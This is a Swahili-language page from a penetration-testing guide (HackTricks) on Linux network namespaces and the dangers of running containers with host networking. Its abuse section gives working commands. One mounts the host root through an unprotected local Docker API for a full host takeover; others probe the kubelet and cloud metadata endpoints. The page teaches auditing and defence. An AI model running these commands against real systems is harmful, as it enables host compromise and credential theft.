# Namespace ya Mtandao

{{#include ../../../../../banners/hacktricks-training.md}}

## Muhtasari

Namespace ya mtandao hutenganisha rasilimali zinazohusiana na mtandao kama interfaces, anwani za IP, routing tables, hali ya ARP/neighbor, sheria za firewall, sockets, na yaliyomo kwenye faili kama `/proc/net`. Hii ndiyo sababu container inaweza kuonekana ina `eth0` yake, routes zake za ndani, na kifaa chake cha loopback bila kumiliki network stack halisi ya host.

Kwa upande wa usalama, hili ni muhimu kwa sababu isolation ya mtandao ni zaidi ya port binding pekee. Private network namespace inaleta mipaka kwa kile workload inaweza kuona au kurekebisha moja kwa moja. Mara namespace hiyo inaposhirikiwa na host, container inaweza ghafla kupata uonekano wa host listeners, host-local services, na network control points ambazo hazikutakiwa kufichuliwa kwa application.

## Uendeshaji

Namespace mpya ya mtandao inaanza na mazingira ya mtandao tupu au karibu tupu hadi interfaces ziunganishwe nayo. Container runtimes huunda au kuunganisha virtual interfaces, hupeana anwani, na kusanidi routes ili workload ipate connectivity inayotarajiwa. Katika deployments za aina bridge, kawaida container inaona interface inayotegemea veth iliyounganishwa na host bridge. Katika Kubernetes, CNI plugins zinashughulikia usanidi sawa kwa Pod networking.

Miundo hii inaelezea kwa nini `--network=host` au `hostNetwork: true` ni mabadiliko makubwa. Badala ya kupokea private network stack iliyotayarishwa, workload inaungana na ile halisi ya host.

## Maabara

Unaweza kuona namespace ya mtandao karibu tupu na:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
Na unaweza kulinganisha containers za kawaida na zilizounganishwa kwenye host-network kwa:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
The host-networked container haijakuwa tena na mtazamo wake wa socket na interface uliotenganishwa. Mabadiliko hayo peke yake ni muhimu kabla hata hujauliza ni capabilities gani mchakato unao.

## Matumizi ya Runtime

Docker na Podman kawaida huunda namespace ya mtandao binafsi kwa kila container isipokuwa imewekwa vinginevyo. Kubernetes kwa kawaida hutoa kila Pod namespace yake ya mtandao, inayoshirikiwa na containers ndani ya Pod hiyo lakini tofauti na host. Incus/LXC systems pia hutoa kutenganishwa kwa kina kulingana na network-namespace, mara nyingi kwa aina kubwa zaidi za mipangilio ya mtandao wa virtual.

Kanuni ya kawaida ni kwamba mtandao binafsi ndio mipaka ya kutenganisha ya default, wakati host networking ni kujiondoa wazi kutoka kwa mipaka hiyo.

## Usanidi mbaya

Usanidi mbaya muhimu zaidi ni kushirikisha namespace ya mtandao ya host. Hii wakati mwingine hufanywa kwa ajili ya performance, low-level monitoring, au convenience, lakini inatoa moja ya mipaka safi zaidi inayopatikana kwa containers. Host-local listeners zinakuwa zinapatikana kwa njia ya moja kwa moja, localhost-only services zinaweza kuwa zinapatikana, na capabilities kama `CAP_NET_ADMIN` au `CAP_NET_RAW` zinakuwa hatari zaidi kwa sababu operations zinazoruhusiwa sasa zinafanyika kwenye mazingira ya mtandao ya host yenyewe.

Tatizo jingine ni overgranting network-related capabilities hata wakati namespace ya mtandao ni binafsi. Namespace binafsi inasaidia, lakini haifanyi raw sockets au advanced network control kuwa salama.

## Matumizi mabaya

Katika mipangilio yenye kutenganishwa dhaifu, attackers wanaweza inspect host listening services, reach management endpoints bound only to loopback, sniff au kuingilia trafiki kulingana na capabilities na mazingira halisi, au kureconfigure routing na firewall state kama `CAP_NET_ADMIN` inapatikana. Katika cluster, hii pia inaweza kufanya lateral movement na control-plane reconnaissance kuwa rahisi.

Ikiwa unashuku host networking, anza kwa kuthibitisha kwamba interfaces na listeners zinazoonekana zinamhusu host badala ya mtandao uliotengwa wa container:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Huduma za loopback pekee mara nyingi ndizo ugunduzi wa kwanza wa kuvutia:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Ikiwa network capabilities zipo, jaribu kama workload inaweza kuchunguza au kubadilisha stack inayoonekana:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
Katika mazingira ya cluster au cloud, host networking pia inatoa msingi wa kufanya recon ya haraka ya ndani ya metadata na huduma zinazokaribia control-plane:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### Mfano Kamili: Host Networking + Local Runtime / Kubelet Access

Host networking haipati host root moja kwa moja, lakini mara nyingi huweka huduma ambazo kwa makusudi zinaweza kufikiwa tu kutoka node yenyewe. Ikiwa moja ya huduma hizo inalindwa vibaya, host networking inakuwa njia ya moja kwa moja ya privilege-escalation.

Docker API kwenye localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet kwenye localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Athari:

- kompromisi ya moja kwa moja ya host ikiwa local runtime API imefunuliwa bila ulinzi unaofaa
- cluster reconnaissance au lateral movement ikiwa kubelet au local agents zinaweza kufikiwa
- traffic manipulation au denial of service wakati ikichanganywa na `CAP_NET_ADMIN`

## Ukaguzi

Lengo la ukaguzi huu ni kujua kama mchakato una private network stack, ni routes na listeners gani vinaonekana, na ikiwa mtazamo wa mtandao tayari unaonekana host-like kabla hata hujajaribu capabilities.
```bash
readlink /proc/self/ns/net   # Network namespace identifier
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
Kinachovutia hapa:

- Ikiwa kitambulisho cha namespace au seti ya interface inayoonekana inaonekana kama host, host networking inaweza tayari kutumika.
- `ss -lntup` ni muhimu sana kwa sababu inaonyesha loopback-only listeners na local management endpoints.
- Routes, interface names, na firewall context yanakuwa muhimu zaidi ikiwa `CAP_NET_ADMIN` au `CAP_NET_RAW` ipo.

Unapokagua container, daima tathmini network namespace pamoja na capability set. Host networking pamoja na strong network capabilities ni mtazamo tofauti kabisa ukilinganisha na bridge networking pamoja na narrow default capability set.
{{#include ../../../../../banners/hacktricks-training.md}}
